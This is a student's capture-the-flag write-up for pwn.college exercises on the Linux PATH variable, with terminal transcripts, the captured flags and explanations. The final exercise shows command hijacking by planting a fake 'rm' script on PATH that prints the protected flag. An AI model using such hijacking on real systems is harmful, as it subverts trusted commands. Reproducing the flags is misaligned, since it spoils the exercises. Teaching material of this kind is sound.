# PONDERING PATH

## THE PATH VARIABLE
### FLAG: pwn.college{wf_AY-RbapINtceXIPG-JspQf3W.dZzNwUDLycTN0czW}
### APPROACH USED: 
````
hacker@path~the-path-variable:~$ PATH=""
hacker@path~the-path-variable:~$ /challenge/run
Trying to remove /flag...
/challenge/run: line 4: rm: No such file or directory
The flag is still there! I might as well give it to you!
pwn.college{wf_AY-RbapINtceXIPG-JspQf3W.dZzNwUDLycTN0czW}
````
In this, change the value of the `PATH` variable to nothing so that when the program tries to remove the flag, it doesnt find the command and the flag is still there.

## Setting PATH
### FLAG:pwn.college{I0pM6F8ryES_vQWuUl0aG-JejcU.dVzNyUDLycTN0czW}
### APPROACH USED:
````
hacker@path~setting-path:~$ PATH=/challenge/more_commands
hacker@path~setting-path:~$ /challenge/run
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{I0pM6F8ryES_vQWuUl0aG-JejcU.dVzNyUDLycTN0czW}
````
In this, we set the `PATH` to `/challenge/more_commands`. This allows the win command to be in the PATH. Therefore, when the challenge is run, the command is found and the flag is revealed.

## ADDING COMMANDS
### FLAG: pwn.college{kC70CEhLXasaElPxwNWrkEHG0ij.dZzNyUDLycTN0czW}
### APPROACH USED:
````
hacker@path~adding-commands:~$ touch win
hacker@path~adding-commands:~$ nano win
hacker@path~adding-commands:~$ cat win
cat /flag
hacker@path~adding-commands:~$ echo $PATH
/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~adding-commands:~$
hacker@path~adding-commands:~$ PATH=~:$PATH
hacker@path~adding-commands:~$ chmod ugo+rwx win
hacker@path~adding-commands:~$ /challenge/run
Invoking 'win'....
pwn.college{kC70CEhLXasaElPxwNWrkEHG0ij.dZzNyUDLycTN0czW}
````
In this, we create a file named **win**. In which we write the command `cat /flag`. Now since we want the cat function to be available in path and also the win file we need needs to be in th path. we add the `~` or the `/home/hacker` directory to the path address.  \
Now we can change the permissions to access the win file to allow all users to read write and execute it.  
now if we run the `/challenge/run` command, we can find the win file and execute the command within to get the flag..

## HIJACKING COMMANDS
### FLAG: pwn.college{QhqYNyNF3ViRnijR-hW3JzDtu6v.ddzNyUDLycTN0czW}
### APPROACH USED:
````
hacker@path~hijacking-commands:~$ touch rm
hacker@path~hijacking-commands:~$ nano rm
hacker@path~hijacking-commands:~$ PATH=~:$PATH
hacker@path~hijacking-commands:~$ chmod uog+x rm
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
pwn.college{QhqYNyNF3ViRnijR-hW3JzDtu6v.ddzNyUDLycTN0czW}
````
In this, we create a file named **rm**. In which we write the command `cat /flag` so that our flag is read instead of being removed. Now since we want the command in th path. we add the `~` or the `/home/hacker` directory to the path address.  \
Now we can change the permissions to access the win file to allow all users to execute it.  
now if we run the `/challenge/run` command, we can find the win file and execute the command within to get the flag.
